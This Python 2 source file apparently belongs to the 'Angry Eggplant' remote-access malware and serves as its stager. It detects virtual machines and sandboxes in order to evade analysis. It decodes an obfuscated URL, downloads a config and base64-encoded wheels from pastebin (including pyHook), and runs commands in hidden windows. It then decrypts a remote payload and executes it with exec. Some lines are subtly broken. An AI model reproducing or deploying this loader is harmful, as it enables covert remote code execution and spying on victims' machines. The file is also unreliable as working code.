#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 Angry Eggplant
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
'''



,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88



'''
from future import print_function
import os
import sys
import time
import json
import struct
import base64
import urllib
import marshal
import subprocess


def debug(output):
    global _debug
    if _debug:
        print(bytes(output))

def execute(cmd):
    global _debug
    try:
        info = subprocess.STARTUPINFO()
        info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
        info.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen( 0, None, None, subprocess.PIPE, subprocess.PIPE, startup=info, shell=True)
    except Exception as e:
        debug(e)
        
def download(uri):
    global _debug
    try:
        return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % uri)).strip('0x').strip('L')))).read()
    except Exception as e:
        debug(e)

def abort(output=None):
    global _debug
    if _debug:
        debug(output)
    else:
        if os.name is 'nt' and 0:
            execute('taskkill /pid %d' % os.getpid())
            execute('shutdown /p /f')                
        elif 0:
            execute('kill -9 %d' % os.getpid())
            execute('shutdown --poweroff --no-wall')
            
def decrypt(data, key):
    global _debug
    data    = base64.b64decode(data)
    blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
    vector  = blocks[0]
    result  = []
    for block in blocks[1:]:
        u,v = struct.unpack("!2L", block)
        k   = struct.unpack("!4L", key)
        d,m = 0x9e3779b9L, 0xffffffffL
        sum = (d * 32) & m
        for _ in range(32):
            v   = (v - (((u << 4 ^ u >> 5) + u) ^ (sum + k[sum >> 11 & 3]))) & m
            sum = (sum - d) & m
            u   = (u - (((v << 4 ^ v >> 5) + v) ^ (sum + k[sum & 3]))) & m
        packed  = struct.pack("!2L", u, v)
        output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
        vector  = block
        result.append(output)
    return ''.join(result).rstrip(chr(0))
    
def run(*args, **kwargs):
    global _debug
    _pip  = subprocess.check_output('where pip' if os.name is 'nt' else 'which pip', shell=True).rstrip()
    if not len(_pip):
        if os.name is 'nt':
            exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
            execute(sys.argv)
            return sys.exit(0)
    if not kwargs.get('config'):
        abort('missing config')
    else:
        _conf = json.loads(download(kwargs.get('config')))
        os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
        packages = json.loads(download(_conf['t'])).get(os.name).get(str(struct.calcsize('P') * 8))
        for name, url in packages.items():
            if not subprocess.call([_pip, 'show', name], shell=True) == 0:
                execute([_pip, 'install', name])
                if not len(execute([_pip, 'show', name])):
                    if 'pastebin' not in url:
                        execute([_pip, 'install', url])
                    else:
                        if 'pyHook' in name:
                            wheel = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                            with file(wheel, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(url).read()))
                            execute([_pip, 'install', wheel])
                            if os.path.isfile(wheel):
                                os.remove(wheel)
                        elif 'pypiwin32' in name:
                            wheel = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                            with file(wheel, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(url).read()))
                            execute([_pip, 'install', wheel])
                            postinstall  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
                            if os.path.isfile(postinstall):
                                execute([postinstall, '-install'])
                            if os.path.isfile(wheel):
                                os.remove(wheel)
                        elif 'pycrypto' in name:
                            wheel = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
                            with file(wheel, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(url).read()))
                            execute([_pip, 'install', wheel])
                            if os.path.isfile(wheel):
                                os.remove(wheel)
        return _conf


def main(*args, **kwargs):
    global _debug
    if kwargs.get('checkvm'):
        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
        check_procs   = [i.split()[0 if os.name is 'nt' else -1] for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        if len(check_environ + check_procs):
            abort('virtual machine or sandbox was detected')
    if kwargs.get('config'):
        _conf = run(**kwargs)
        _init = download(_conf.get('w'))
        _main = download(_conf.get('j'))
        _body = download(_conf.get('u'))
        _code = download(_conf.get('z'))
        main  = _main + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(_conf))
        init  = 'from __future__ import print_function\nfor module in """{}""".splitlines():\n\ttry:\n\t\texec module in globals()\n\texcept: pass\n'.format(_init)
        code  = base64.b64decode(_code)
        body  = decrypt(_body, code)
        exec '\n\n'.join([init, body, main]) in globals()

